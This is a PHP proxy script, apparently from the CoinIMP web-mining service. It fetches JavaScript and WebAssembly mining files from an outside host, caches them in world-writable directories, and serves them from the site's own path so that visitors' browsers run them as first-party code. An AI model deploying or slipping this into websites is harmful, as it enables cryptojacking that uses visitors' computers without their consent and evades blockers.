<?php

$URL_GET = 'http://www.wasm.stream/';
$CACHE_TIME = '1 hour';
$CACHE_DIR = 'coinimp-cache';

function get_file_from_server($filename)
{
    global $URL_GET;
    $filename = urlencode($filename);
    $uri = strtok($_SERVER['REQUEST_URI'],'?');
    $host = urlencode((isset($_SERVER['HTTPS']) ? 'https' : 'http') . "://" . $_SERVER['HTTP_HOST'] . "$uri");
    return file_get_contents("$URL_GET?filename=$filename&host=$host");
}

function filename_match($filename)
{
    return preg_match('/^\w{4}\.js$/', $filename)
        || preg_match('/^\w{6}\.js$/', $filename)
        || preg_match('/^\w{7}\.min\.js\.mem$/', $filename)
        || preg_match('/^\w{8}\.wasm$/', $filename);
}

function get_cache_dir()
{
    $dirs = array('coinimp-cache', 'tmp/coinimp-cache', '/tmp/coinimp-cache');
    foreach ($dirs as $dir)
    {
        if(!file_exists($dir))
            mkdir($dir, 0777, true);

        if(is_writeable($dir))
            return $dir;
    }
    die('Cache directory "coinimp-cache" is not writeable!');
}

$CACHE_DIR = get_cache_dir();

$req_file = $_GET['f'];

if (!filename_match($req_file))
{
    die('Invalid argument');
}

$cache_filename = "$CACHE_DIR/$req_file";
if (!file_exists($cache_filename) || (filemtime($cache_filename) < strtotime("-$CACHE_TIME")))
{
    $script = get_file_from_server($req_file);
    file_put_contents($cache_filename, $script);
}
else
{
    $script = file_get_contents($cache_filename);
}

$type = substr($req_file, -2) == 'js'
    ? 'application/javascript'
    : 'application/octet-stream';

header('Content-Type: ' . $type . '; charset=utf-8');

die($script);
